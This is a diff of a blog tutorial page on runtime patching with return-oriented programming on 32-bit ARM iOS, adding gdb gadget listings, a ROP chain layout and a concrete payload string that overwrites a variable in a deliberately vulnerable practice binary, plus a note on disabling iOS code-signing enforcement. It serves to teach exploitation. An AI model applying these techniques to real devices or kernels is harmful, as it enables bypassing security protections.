@@ -15,7 +15,7 @@
 <meta itemprop="description" content="Runtime patching Runtime patching is the process of patching instructions or variables in a process during it&rsquo;s runtime.">
 <meta itemprop="datePublished" content="2020-08-20T23:07:00+02:00" />
 <meta itemprop="dateModified" content="2020-08-20T23:07:00+02:00" />
-<meta itemprop="wordCount" content="508">
+<meta itemprop="wordCount" content="835">
 
 
 
@@ -160,14 +160,14 @@
   <h1>0x05 Runtime patching</h1>
 
   <div class="post-date">
-    <time datetime="2020-08-20T23:07:00&#43;0200">Aug 20, 2020</time> &middot; 3 min read
+    <time datetime="2020-08-20T23:07:00&#43;0200">Aug 20, 2020</time> &middot; 4 min read
   </div>
 
   <h2 id="runtime-patching">Runtime patching</h2>
 <p>Runtime patching is the process of patching instructions or variables in a process during it&rsquo;s runtime. Oppose to opening the binary in a disassembler, replacing instructions and producing a modified executable, runtime patching with Return Oriented Programming does not involve modifying the executable file as all of the patches are applied to the program as it is running.</p>
 <p>Why do we need this? While simply statically patching a binary and producing a new executable is easier, it is not possible when attempting to patch the iOS kernel or another important process in an embedded system. With the iOS kernel, patching invalidates it&rsquo;s digital code signature which will result in it being rejected by iBoot during boot time (unless iBoot is also patched). Therefore the iOS kernel must have it&rsquo;s security features patched while it is already running through the user of a ROP payload.</p>
 <p>To apply patches to a running process using ROP, first we need a way to allow us to write arbitrary data to a memory location of our choice.</p>
-<p>This isn&rsquo;t possible when working with simple programs as the area of memory that stores the actual instructions (__TEXT) is marked as Non-Writeable :sad: This means that attempting to overwrite instructions with our own will cause a crash and the exploit will fail. To workaround this, we must modify the kernel to be able to modify the page tables. So in this tutorial we will only attempt to patch __DATA section as this area of memory is marked as Writeable.</p>
+<p>This isn&rsquo;t possible when working with simple programs as the area of memory that stores the actual instructions (__TEXT) is marked as Non-Writeable 😒 This means that attempting to overwrite instructions with our own will cause a crash and the exploit will fail. To workaround this, we must modify the kernel to be able to modify the page tables. So in this tutorial we will only attempt to patch __DATA section as this area of memory is marked as Writeable.</p>
 <p>To be able to write to an arbitrary memory location, we need to use a special type of ROP gadget. These types of gadgets are known as &ldquo;write gadgets&rdquo; as they allow us to specific the data and the address in memory to write it to.</p>
 <p>Let&rsquo;s prepare app for testing:</p>
 <h2 id="0x05c">0x05.c</h2>
@@ -226,7 +226,7 @@
 
 <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
     <span style="color:#66d9ef">int</span> a <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-    printf(<span style="color:#e6db74">&#34;0x04 Runtime patching tests</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+    printf(<span style="color:#e6db74">&#34;0x05 Runtime patching tests</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
     <span style="color:#66d9ef">while</span> (a <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
         printf(<span style="color:#e6db74">&#34;Select an option:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[1] option 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[2] option 2 (internal)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[3] exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
         <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">8</span>];
@@ -238,7 +238,44 @@
 </code></pre></div><p>Compile and sign:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ clang 0x05.c -fno-stack-protector -fno-pie -arch armv7 -mios-version-min<span style="color:#f92672">=</span><span style="color:#ae81ff">6</span> -mno-thumb -isysroot /var/root/theos/sdks/iPhoneOS10.3.sdk/ -o 0x05
 $ ldid -S 0x05
-</code></pre></div>
+</code></pre></div><p>Now to analyse the binary we can use more sophisticated tool like Hopper Disassembler or IDA, which will nicely show us program flow in graphs. We will hopefully cover the binary analysis in more advanced programs next time. But for now we will focus on this tutorial task, which is patching the app during it&rsquo;s runtime. So let&rsquo;s say we analysed the binary and recognized that the <code>validate()</code> function is based on one variable only, <code>internal_mode</code>. So what we need to do is to patch this variable during program run, so we can access functionality we were not designed to 😉</p>
+<pre><code class="language-quote" data-lang="quote">Sidenote
+This situation is similar to the iOS kernel exploiting, where attacker can patch the variable &quot;cs_enforcement_disable&quot; from &quot;0&quot; to &quot;1&quot; to disable the code signing enforcement
+</code></pre><p>Ok, so to prepare our exploit, we need to first find suitable gadgets.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gdb 0x05
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions
+...
+0x0000bbf4  func1
+0x0000bc18  func_internal
+0x0000bcc4  validate
+0x0000bd64  write_anywhere
+0x0000bd6c  gadget
+0x0000bd74  main
+0x0000bdf4   stub helpers
+0x0000bff0  dyld_stub_exit
+0x0000bff4  dyld_stub_printf
+0x0000bff8  dyld_stub_scanf
+0x0000bffc  dyld_stub_system
+
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disass write_anywhere
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> write_anywhere:
+0x0000bd64 &lt;write_anywhere+0&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">81</span> e5                   str	r0, <span style="color:#f92672">[</span>r1<span style="color:#f92672">]</span>
+0x0000bd68 &lt;write_anywhere+4&gt;:  1e ff 2f e1                   bx	lr
+End of assembler dump.
+
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disass gadget
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> gadget:
+0x0000bd6c &lt;gadget+0&gt;:  <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">80</span> bd e8                   pop	<span style="color:#f92672">{</span>r0, r1, pc<span style="color:#f92672">}</span>
+0x0000bd70 &lt;gadget+4&gt;:  1e ff 2f e1                   bx	lr
+End of assembler dump.
+
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info variables
+0x0000c018  internal_mode
+</code></pre></div><p>We will use two gadgets here: one from <code>write_anywhere()</code>, second from <code>gadget()</code>. At the end of the exploit string we add the 4 junk bytes and redirect to <code>main()</code> so that once the patch is applied, instead of the program crashing, it returns back to the start of the <code>main()</code> function. This effectively restarts the program with the patch applied. So ROP chain will look something like this:</p>
+<pre><code>junk characters + gadget + new_value_of_variable + address_of_variable + write_gadget + 4_junk_bytes + main()
+</code></pre><p>Which will effectively lead to:</p>
+<pre><code>AAAABBBBCCCCDDDDEEEE\x6c\xbd\x00\x00AAAA\x18\xc0\x00\x00\x64\xbd\x00\x00AAAA\x74\xbd\x00\x00
+</code></pre>
 </div>
 
 
